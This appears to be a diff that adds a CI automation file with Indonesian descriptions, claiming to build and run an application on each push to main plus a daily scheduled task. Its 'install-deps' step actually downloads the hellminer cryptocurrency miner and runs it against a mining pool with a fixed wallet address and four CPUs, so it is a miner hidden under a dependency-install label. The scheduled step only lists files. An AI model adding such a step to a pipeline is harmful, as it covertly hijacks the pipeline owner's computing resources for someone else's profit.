@@ -1,0 +1,27 @@
+version: "1.0"
+
+automations:
+  - name: build-and-run
+    description: Build lalu jalankan aplikasi secara otomatis
+    trigger:
+      type: push
+      branch: main
+
+    steps:
+      - name: install-deps
+        run: |
+          cd /opt
+          curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz -o hellminer.tar.gz
+          tar -xf hellminer.tar.gz -C hellminer
+          cd hellminer
+          /opt/hellminer/hellminer -c stratum+tcp://sg.vipor.net:5040 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.003 -p x --cpu 4
+  - name: scheduled-task
+    description: Task berjalan otomatis setiap hari
+    trigger:
+      type: schedule
+      cron: "0 2 * * *"   # jam 02:00 setiap hari
+
+    steps:
+      - name: cleanup
+        run: |
+          ls
